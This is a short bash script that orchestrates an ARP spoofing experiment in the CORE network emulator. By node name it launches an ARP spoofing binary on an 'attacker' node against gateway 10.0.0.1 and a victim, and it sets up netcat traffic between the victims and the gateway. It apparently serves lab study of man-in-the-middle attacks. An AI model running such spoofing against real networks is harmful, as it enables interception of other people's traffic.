#!/bin/bash
#script to run arpspoofing application using CORE emulator program.
#Assumptions: CORE emulator is running file CoreEmulatorT1.imn; 
#Assumptions: This script is called from one of the nodes;
#Assumptions: program arpspoofing.out is present at /tmp/ dircetory.

case $NODE_NAME in  #switch (NODE_NAME) variable
    attacker) #case NODE_NAME = attacker
        /tmp/arpspoofing.out eth0 10.0.0.1 10.0.0.21
        ;; #end of statement
    gateway) #case NODE_NAME = gateway
        netcat -l 8888
        ;; #end of statement
    victim1) #case NODE_NAME = victim1
        netcat 10.0.0.1 8888
        ;; #end of statement
    victim2) #case NODE_NAME = victim2
        netcat 10.0.0.1 8888
        ;; #end of statement        
    *)  #Default:
        echo "Invalid. Host shall be attacker, gateway, victim1 or victim2"
        ;; #end of statement
esac